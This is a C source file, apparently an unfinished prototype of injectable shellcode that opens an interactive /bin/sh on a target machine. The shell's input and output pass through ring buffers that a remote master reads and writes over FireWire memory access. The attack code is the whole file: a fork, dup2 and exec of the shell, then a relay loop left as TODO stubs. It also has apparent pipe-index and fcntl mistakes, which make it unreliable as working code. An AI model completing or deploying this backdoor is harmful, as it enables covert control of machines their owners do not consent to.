
// simple outline of a to-be-injected shellcode that gives
// an interactive shell over firewire
//
// obviously this needs to be recoded as PIC in ASM, the smaller, the better.
// 	ESI -> ringbuffer_from_master
// 	EDI -> ringbuffer_to_master
// 	EBP -> c2sh[0], sh2c[1]

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#define RB_SIZE 512

struct ringbuffer {
	volatile int	writer_pos;		// init to 0
	volatile int	reader_pos;		// init to 0
	char		buffer[RB_SIZE];
};

int main()
{
	// pipes:
	int c2sh[2];	// parent->shell	 0: parent writes;			1: shell reads (stdin);
	int sh2c[2];	// shell->parent	 0: shell writes (stdout,stderr);	1: parent reads;

	int		child_is_dead = 0;
	volatile int	child_is_dead_ACK = 0;

	// flags inidacing, wheather the pipes to/from the child are ok
	int		to_slave_ok = 1;
	int		from_slave_ok = 1;

	// ringbuffer for communication with master
	struct ringbuffer from_master;
	struct ringbuffer to_master;

	// non-volatile copy of ringbuffer position
	int rb_position;

	if(0 > pipe(c2sh))
		goto child_dead;
	if(0 > pipe(sh2c))
		goto child_dead;

	switch(fork()) {
		case 0:
			// child: change stdin, stdout and stderr and exec /bin/sh
			if(0 != dup2(c2sh[1], 0))
				exit(0);
			if(1 != dup2(sh2c[0], 1))
				exit(0);
			if(2 != dup2(sh2c[0], 2))
				exit(0);

			execl("/bin/sh", "/bin/sh", NULL);
			exit(0);

		default:
			// parent: use a ringbuffer for stdin and stdout of child
			close(c2sh[1]);
			close(sh2c[0]);

			// parent has to read from sh2c[1] and write to c2sh[0]
			//            -> O_ASYNC
			//            		only kernel2.6 for pipes...
			//            		optional, in combination with nanosleep?
			//            -> O_NONBLOCK
			fcntl(sh2c[1], F_GETFL, O_NONBLOCK);
			
			// TODO:
			// loop with read/write relayed via ringbuffer and nanosleep
			// 	(signal-handler -> ret and O_ASYNC for nanosleep?)
			// when both FD are closed:
			while(to_slave_ok || from_slave_ok) {
				// cache the volatile value...
				rb_position = from_master.writer_pos;
				if(to_slave_ok) {
					// unless buffer is empty
					if(rb_position != from_master.reader_pos) {
						// do write...
					}
				}

				rb_position = to_master.reader_pos;
				if(from_slave_ok) {
					// unless buffer is full
					if( !(to_master.writer_pos == rb_position) ) {
						// do read...
					}
				}
			}
			goto child_dead;

		case -1:
			goto child_dead;
	}

child_dead:
	while(child_is_dead <= 2 && child_is_dead_ACK == 0) {
		child_is_dead++;
		sleep(1);
	}

	exit(0);
}

